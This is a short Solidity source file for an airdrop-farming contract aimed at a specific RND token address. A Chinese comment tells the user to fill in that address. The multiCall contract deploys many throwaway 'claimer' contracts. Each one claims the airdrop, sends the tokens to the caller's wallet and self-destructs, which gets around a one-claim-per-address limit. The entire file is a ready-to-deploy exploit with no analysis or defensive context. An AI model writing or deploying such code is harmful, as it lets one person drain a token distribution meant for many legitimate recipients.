// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

// Uncomment this line to use console.log
// import "hardhat/console.sol";

interface airdrop {
    function transfer(address recipient, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function claim() external;
}

contract multiCall{
    //                                此处填写 RND 代币的合约地址
    address constant contra = address(0xcb33F7FB101E377a4b0e19fD647F391fAD14d0B5);
    function call(uint256 times) public {
        for(uint i=0;i<times;++i){
            new claimer(contra);
        }
    }
}
contract claimer{
    constructor(address contra){
        airdrop(contra).claim();
        uint256 balance = airdrop(contra).balanceOf(address(this));
        airdrop(contra).transfer(address(tx.origin), balance);
        selfdestruct(payable(address(msg.sender)));
    }
}
